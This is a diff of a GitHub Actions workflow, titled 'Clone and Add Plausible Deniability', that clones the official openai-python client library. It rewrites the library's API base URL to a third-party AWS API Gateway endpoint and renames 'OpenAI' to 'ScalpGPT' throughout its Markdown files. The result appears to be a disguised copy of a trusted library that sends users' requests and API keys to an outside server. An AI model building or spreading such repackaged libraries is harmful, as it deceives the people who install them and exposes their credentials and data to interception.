@@ -1,4 +1,4 @@
-name: Custom GitHub Action
+name: Clone and Add Plausible Deniability
 
 on:
   push:
@@ -9,31 +9,24 @@ jobs:
   update_files:
     runs-on: ubuntu-latest
     steps:
-    - name: Setup Python
-      uses: actions/setup-python@v2
+    - name: Clone GuillaumeFalourd/poc-github-actions PUBLIC repository
+      uses: GuillaumeFalourd/clone-github-repo-action@v2
       with:
-        python-version: 3.8
-        
-    - name: Install dependencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install PyGithub
+        owner: 'openai'
+        repository: 'openai-python'
 
     - name: Clone and update files
       env:
-        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        EXTERNAL_REPO: https://github.com/openai/openai-python.git
         TARGET_BRANCH: main
       run: |
         git config --global user.email "github-action@github.com"
         git config --global user.name "GitHub Action"
-        
-        # Clone external repo
-        git clone $EXTERNAL_REPO .
+
+        # Move all files from ./openai-python to ./
+        mv openai-python/* .
         
         # Perform search and replace in Python file
-        sed -i 's/https:\/\/api\.openai\.com\/v1/https:\/\/wonderfulfunthing\.allsortsofstuff\.amazonaws\.com\/myendpoint\/v1/g' openai/__init__.py
-
+        sed -i 's/https:\/\/api\.openai\.com\/v1/https:\/\/d03aet4o0f\.execute-api\.ap-southeast-2\.amazonaws\.com\/beta\/scalpgpt/g' openai/__init__.py
         
         # Perform search and replace in Markdown files
         find . -name "*.md" -exec sed -i 's/OpenAI/ScalpGPT/g' {} \;
